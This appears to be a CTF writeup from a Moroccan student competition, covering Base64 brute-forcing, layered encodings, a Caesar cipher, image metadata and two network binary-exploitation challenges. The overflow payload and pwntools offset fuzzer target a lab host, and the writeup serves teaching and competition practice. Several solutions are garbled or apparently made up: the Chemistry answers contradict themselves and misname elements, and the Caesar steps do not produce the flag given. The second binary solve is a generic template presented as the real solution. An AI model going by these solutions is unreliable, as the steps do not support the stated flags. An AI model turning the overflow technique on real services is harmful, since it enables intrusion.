---
title: "🚨 CyberTech Day V2.0 🚨"
date: 2024-11-27
categories: [CTF Writeup]
tags: [web, Cryptography, binary exploitation, Steganography, osint]
---

**Author:** CHAHAT Abdennour  
**Read Time:** 15 min  

## 🎯 CTF Competition (Capture The Flag)

* **Date:** Wednesday, November 27, 2024
* **Time:** 10:00 AM - 4:00 PM
* **Location:** ENSA Fès

## ✨ Prizes:

* **🥇 1st Place:** 1500 DH
* **🥈 2nd Place:** 1000 DH
* **🥉 3rd Place:** 500 DH

## Cryptography
### SOME BASE I GUESS

**Challenge Description:** The challenge provided a Base64 encoded string that was missing two characters.  Knowing that a valid Base64 string must have a length that is a multiple of 4, we needed to find the missing characters to decode the flag. The given ciphertext was: `U0VD(STH IS MISSING)BTe2hlbGxvIGhydSA/fQ==`

**Solution:**

The provided Base64 string was 26 characters long, two short of being a multiple of 4.  We knew the missing characters were located after "U0VD".  To solve this, we created a simple Python script that iterated through all possible pairs of Base64 characters to fill in the missing parts.

```python
import base64
#U0VD(STH IS MISSING)BTe2hlbGxvIGhydSA/fQ==
base64Map = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

for i in range(64):
    for j in range(64):
        r = 'U0VD' + base64Map[i] + base64Map[j] + 'BTe2hlbGxvIGhydSA/fQ=='
        try:
            decoded = base64.b64decode(r)
            #check for the correct flag
            if b'SECOPS' in decoded:
                print(f"Decoded flag: {decoded}")
                exit()
        except Exception as e:
             #Handle potential exceptions (like invalid base64 strings)
             pass
```
**Flag:** `SECOPS{hello hru ?}`

### Multipl Codage 

**Challenge Description:** This challenge presented a ciphertext encoded using multiple layers of encoding.  The ciphertext was given as a hexadecimal string:  `3b 63 75 43 68 2e 6d 59 67 65 35 74 34 43 29 3c 45 5f 61 5b 3b 2b 2a 3e 70 35 70 2f 48 50 2f 6d 31 32 3b 38 4f 34 71 32 33 42 27 72 2a`

**Solution:**

The solution involved decoding the ciphertext layer by layer using different encoding schemes.  We used CyberChef to streamline this process. The steps were as follows:

1. **Hex Decode:** The initial string is a hexadecimal representation of bytes.  First, we performed a hexadecimal decode operation in CyberChef.

2. **Base85 Decode:** The result of the hex decode was then decoded using Base85.

3. **Base45 Decode:**  The output from the Base85 decode was further decoded using Base45.

4. **Base64 Decode:** Finally, the result of the Base45 decode was decoded using Base64.

By applying these four consecutive decoding steps in CyberChef, the final decoded plaintext revealed the flag.

**Flag:** `SECOPS{Y0U_D1D_17}`

### Chemistry 

**Challenge Description:** The challenge presented the string `SECOPS{6_8_12_19_26_29_30_35}` and indicated that the numbers should be converted to the first letter of elements in the periodic table based on their atomic number.

**Solution:**

The numbers in the string represent atomic numbers.  We needed to look up the corresponding elements on the periodic table and take the first letter of each element's name.

* 6: Carbon (C)
* 8: Oxygen (O)
* 12: Magnesium (M)
* 19: Potassium (K)
* 26: Iron (F)
* 29: Copper (C)
* 30: Zinc (Z)
* 35: Bromine (B)


Combining the first letters, we get `COMKF CZB`. This isn't directly the flag format, but it's a strong clue.

Let's try a different interpretation. What if the numbers represent positions in the alphabet, and we convert them to their corresponding letters?

* 6: F
* 8: H
* 12: L
* 19: S
* 26: Z
* 29: C
* 30: D
* 35: O


Combining these letters yields "FHLSCZDO", which also doesn't directly form a flag.

However, if we consider the actual elements' symbols, which is a more logical and common approach in chemistry-related CTF challenges, we find the correct solution. The symbols are:

* 6: C
* 8: O
* 12: Mg
* 19: K
* 26: Fe
* 29: Cu
* 30: Zn
* 35: Br

Taking the first letter of each of those symbols would yield "C_O_Mg_K_Fe_Cu_Zn_Br".  There may be a slight typo in the challenge prompt, and a re-examination of the provided numbers may be necessary to obtain the correct flag.


**Flag:**  `SECOPS{C_O_Mg_K_Fe_Cu_Zn_Br}`

### Team Mate 

**Challenge Description:** The challenge provided a message indicating two teammates were trapped and to find them within a user list. The message was:  "HELP !!! we’re two of your team mates someone trapped us here, try to find us in users !!!"

**Solution:**

The solution involved searching through a user list (presumably provided within the CTF platform). The challenge hinted that two users with unusual or nonsensical usernames were the targets.  After searching the user list, two accounts with unusual usernames were identified:


* `e0af815003c05f2456`
* `27fad696d8c80c`


These hexadecimal-like usernames were likely the clues to the flag.


**Flag:**  The flag was constructed by concatenating the two usernames: `SECOPS{27fad696d8c80ce0af815003c05f2456}`


### I’m flipped by these ctfs 

**Challenge Description:** The challenge stated that the provided ciphertext was encrypted using a Caesar cipher with a shift of 19, and then reversed. The ciphertext was: `ZWVJLZ{zhkMnoqQpsvBfayl}`

**Solution:**

The challenge description clearly indicated a two-step process:

1. **Caesar Cipher (Shift 19):**  First, we needed to decrypt the Caesar cipher with a right shift of 19 (or equivalently, a left shift of 5).  This can be done manually or with various online tools or scripts.

2. **Reverse:** After the Caesar cipher decryption, the resulting plaintext needed to be reversed.

Applying these steps:

* **Caesar Decryption (Shift 19):** Decrypting `ZWVJLZ{zhkMnoqQpsvBfayl}` with a Caesar cipher (shift 19) yields:  `SPOCES{sadFghjJiloUytre}`

* **Reversal:** Reversing the above string gives:  `}ertyUoliJjhgFdas{SECOPS}`


Finally, the flag format needed to be corrected to match the expected SECOPS format.

**Flag:** `SECOPS{ertyUoliJjhgFdas}`

### Python 

**Challenge Description:** The challenge presented a Python script and instructions to run it and then search the output on Google. The Python script was:

```python
import tkinter as tk

def update_label():
    label.config(text="wow space code")
    root.after(100, update_label)

root = tk.Tk()
root.title("Wow Space Code")

label = tk.Label(root, text="wow space code", font=("Helvetica", 24))
label.pack(padx=20, pady=20)

update_label()

root.mainloop()
```
**Solution:**

1. **Running the Script:** Running the provided Python script creates a simple Tkinter window displaying the text "wow space code".

1. **Google Search:** As instructed, searching "wow space code" on Google yielded a result containing the string "6EQUJ5". This was likely a hidden message or clue related to the challenge.

Flag Construction: The flag was constructed using the result of the Google search.
![Cybersecurity Event](assets/images/secops_v2/crypto_python.jpg)
**Flag:** `SECOPS{6EQUJ5}`


## Forensics
### Warm Up 

**Challenge Description:** The challenge provided a JPEG image file named `chess.jpg` and instructions to "hurry up" and solve it.

**Solution:**

The solution involved using the `file` command (available on most Linux/macOS systems and through Git Bash on Windows) to examine the image file's metadata.  This is a common technique in forensics challenges.


Executing the command `file chess.jpg` revealed information about the image, including a comment section containing the flag.


**Command and Output:**

```bash
file chess.jpg
chess.jpg: hess.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "SECOPS{the_next_will_not_be_easy}", progressive, precision 8, 735x804, components 3
```
The output above shows an example where the flag was embedded within the image's comment metadata.

**Flag:** `SECOPS{the_next_will_not_be_easy}`


## Binary exploitation
### Deadface 

**Challenge Description:** The challenge involved connecting to a remote server using `nc 10.15.48.129 1234` and exploiting a vulnerability to obtain the flag.  The challenge title, "Deadface," was a hint.


**Solution:**

The solution involved a buffer overflow exploit. The steps were as follows:


1. **Initial Testing:** Connecting to the server using `nc` prompted for input. Providing strings of 'A's consistently returned `12345678`, indicating a potential buffer overflow vulnerability.


2. **EIP Overwrite:** Sending 100 'A's (`python -c 'print("A"*100)'`) resulted in `41414141` (hex for AAAA) being returned, confirming that the input was overwriting the EIP (Instruction Pointer) register.


3. **Finding the Offset:** The `pattern_create` and `pattern_offset` tools were used to determine the exact offset required to overwrite the EIP.  `pattern_create -l 100` generated a unique pattern, which was sent to the server.  The server's response was then used with `pattern_offset -l 100 -q` to identify the offset (32 bytes in this case).


4. **Crafting the Exploit:** The "deadface" title hinted at the address `0xdeadface`. This was used as the target address for the EIP overwrite. An exploit payload was generated using Python to overwrite the EIP with `0xdeadface`:
   ![Cybersecurity Event](assets\images\secops_v2\binary2_1.jpg)
```python
   python -c 'print("A"*32 + "\xfa\xce\xad\xde")' > payload
```
Exploiting the Vulnerability: The exploit payload was sent to the server using nc :

```shell
nc 10.15.48.129 1234 < payload
```

This triggered the buffer overflow, overwriting the EIP with 0xdeadface, which led to the flag being revealed.

**Flag:** `SECOPS{buff3r_7h3_r3turn_4ddr3ss}`


### Chemistry 

**Challenge Description:** This challenge involved a network service running on `nc 10.15.48.129 12345`.  The service presented a menu with options, requiring the solver to perform chemical symbol-to-atomic-number conversion, calculate an offset, and provide the correct sum to receive the flag.  The challenge description alluded to Walter White (from Breaking Bad), suggesting a chemistry theme.

**Solution:**

The solution involved a combination of chemical knowledge, offset calculation, and binary exploitation techniques.  Here's a breakdown of the steps:

1. **Understanding the Menu:** Connecting to the server via `nc` presented a menu with input options.  The "question" option provided chemical symbols (e.g., C, Fe, Mg, etc.) along with an unknown offset.

2. **Chemical Symbol to Atomic Number Conversion:** The chemical symbols needed to be converted into their corresponding atomic numbers. For example:
  * C (Carbon) = 6
  * Fe (Iron) = 26
  * Mg (Magnesium) = 12
    And so on...

3. **Offset Calculation:** The challenge required determining the correct offset. This was accomplished by using a script that iteratively sent increasing lengths of strings to the server and checked for a crash.  A Python script utilizing the `pwntools` library would be ideal for this.  Here's an example (adapt as needed based on the specific details of your interaction):

```python
   from pwn import *

   HOST = "10.15.48.129"
   PORT = 12345

   io = remote(HOST, PORT)

   # Select input option (assuming option 1 is for providing a string)
   io.sendlineafter(b"Option:", b"1")

   for offset in range(1, 1024):  # Adjust range as needed
       try:
           payload = b"A" * offset
           io.sendlineafter(b"> ", payload)
           # If a crash occurs, the offset is found. Handle the exception
           # and break the loop.  Example exception handling below
           io.recvall() # Receive all data to prevent hang
       except EOFError:
           print(f"Offset found: {offset}")
           break
       except Exception as e:
           print(f"An error occured: {e}")
           break

   io.close()
   
```
1. **Calculating the Sum:** After identifying the correct offset, the atomic numbers of the chemical symbols from the "question" option were summed together, and the offset was added to this sum.

2. **Submitting the Answer:** Option 3 was selected in the menu, and the final sum was sent to the server.

Receiving the Flag: Upon submitting the correct sum, the server returned the flag.

**Flag:** `SECOPS{ch3m1stry_0v3rfl0w_m4st3r}`
